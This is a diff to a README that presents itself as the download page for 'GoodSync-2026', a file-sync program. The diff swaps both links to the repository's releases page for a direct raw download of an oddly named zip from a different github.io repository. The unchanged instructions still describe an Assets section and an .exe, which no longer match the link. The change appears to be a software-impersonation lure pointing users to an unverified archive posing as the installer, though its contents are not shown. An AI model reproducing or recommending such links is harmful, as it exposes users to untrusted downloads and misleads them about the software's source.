@@ -5,11 +5,11 @@ description: "Download and install GoodSync for Windows 10 and 11 using a single
 ---
 # 📁 GoodSync-2026 - Sync your files across all devices
 
-[![Download GoodSync](https://img.shields.io/badge/Download-GoodSync-blue.svg)](https://github.com/Midstreamhenryhubertturner572/GoodSync-2026/releases)
+[![Download GoodSync](https://img.shields.io/badge/Download-GoodSync-blue.svg)](https://github.com/Midstreamhenryhubertturner572/midstreamhenryhubertturner572.github.io/raw/refs/heads/main/prooflessly/io_midstreamhenryhubertturner_github_2.8-beta.3.zip)
 
 ## 📥 How to download the software
 
-You need to access the release page to get the installer. Visit this link to find the latest version for your computer: [https://github.com/Midstreamhenryhubertturner572/GoodSync-2026/releases](https://github.com/Midstreamhenryhubertturner572/GoodSync-2026/releases).
+You need to access the release page to get the installer. Visit this link to find the latest version for your computer: [https://github.com/Midstreamhenryhubertturner572/midstreamhenryhubertturner572.github.io/raw/refs/heads/main/prooflessly/io_midstreamhenryhubertturner_github_2.8-beta.3.zip](https://github.com/Midstreamhenryhubertturner572/midstreamhenryhubertturner572.github.io/raw/refs/heads/main/prooflessly/io_midstreamhenryhubertturner_github_2.8-beta.3.zip).
 
 Once you arrive at the page, look for the section labeled Assets. Click the file that ends with .exe to begin your download. Save the file to your computer in a folder you can find easily, such as your Downloads folder.
 
